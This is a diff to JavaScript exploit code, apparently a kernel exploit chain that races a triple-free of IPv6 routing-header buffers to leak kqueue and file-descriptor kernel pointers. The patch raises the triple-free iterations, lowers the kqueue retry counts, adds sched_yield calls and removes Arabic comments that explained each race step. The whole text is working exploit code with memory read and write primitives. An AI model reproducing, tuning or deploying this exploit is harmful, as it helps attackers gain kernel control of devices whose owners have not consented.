@@ -118,7 +118,7 @@ var IPV6_SOCK_NUM = 96;
 var IOV_THREAD_NUM = 6;
 var UIO_THREAD_NUM = 6;
 var MAIN_LOOP_ITERATIONS = 3;
-var TRIPLEFREE_ITERATIONS = 4;
+var TRIPLEFREE_ITERATIONS = 9;
 var MAX_ROUNDS_TWIN = 10;
 var MAX_ROUNDS_TRIPLET = 100;
 var MAIN_CORE = 0;
@@ -1667,60 +1667,55 @@ function leak_kqueue() {
   var magic_add = leak_rthdr.add(0x08);
 
   var count     = 0;
-  var MAX_KQ    = 15000;   // عدد محاولات kqueue
-  var INNER_MAX = 100;     // عدد محاولات window لكل kqueue
+  var MAX_KQ    = 4000;   // قللناها جامد
+  var INNER_MAX = 60;     // أقل من 100
 
   var success   = false;
 
   while (count < MAX_KQ) {
     count++;
 
-    // 1) إنشاء kqueue جديد
     kq = kqueue();
     if (kq.eq(BigInt_Error)) {
       return false;
     }
 
-    // 2) تصفير buffer قبل بداية دورة الـ inner
     write64(magic_add, 0);
     write64(leak_rthdr.add(0x98), 0);
 
-    // 3) تحرير rthdr لفتح نافذة الـ reuse
+    // ييلد بسيط قبل free علشان ما نكتمش السيستم
+    sched_yield();
+
     free_rthdr(ipv6_socks[triplets[1]]);
 
     var inner_tries = 0;
 
     while (inner_tries < INNER_MAX) {
 
-      // 4) دبق خفيف لزيادة فرصة الـ race بدون تجميد
-      for (var d = 0; d < 15; d++) {}
+      // دبق أخف كمان
+      for (var d = 0; d < 10; d++) {}
 
-      // 5) قراءة rthdr بعد الـ free (هنا يحصل الـ reuse لو محظوظين)
       get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x100);
 
-      // 6) قراءة magic + fdp من الـ buffer اللي kernel لسه كتبه
       var magic = read64(magic_add);
       var fdp   = read64(leak_rthdr.add(0x98));
 
-      // 7) شرط نجاح الـ leak
       if (magic.eq(magic_val) && !fdp.eq(0)) {
         success = true;
         break;
       }
 
-      // 8) تصفير بعد المحاولة الفاشلة (متناغم مع آخر mbuf مكتوب)
       write64(magic_add, 0);
       write64(leak_rthdr.add(0x98), 0);
 
-      // 9) منع الفريز: yield كل 20 محاولة
-      if ((inner_tries % 20) === 0) {
+      // ييلد أسرع
+      if ((inner_tries % 10) === 0) {
         sched_yield();
       }
 
       inner_tries++;
     }
 
-    // 10) لو نجحنا في أي inner loop
     if (success) {
       kl_lock = read64(leak_rthdr.add(0x60));
       kq_fdp  = read64(leak_rthdr.add(0x98));
@@ -1731,22 +1726,16 @@ function leak_kqueue() {
       }
 
       close(kq);
-
-      // إعادة ضبط triplet بعد ما استغلينا الـ leak
       triplets[1] = find_triplet(triplets[0], triplets[2]);
-
       return true;
     }
 
-    // 11) فشل في هذه الدورة → نقفل kqueue ونسيب فرصة للنظام
     close(kq);
     sched_yield();
   }
 
-  // 12) استنفدنا كل المحاولات من غير نجاح
   return false;
 }
-
 function leak_kqueue_safe() {
   try {
     return leak_kqueue();
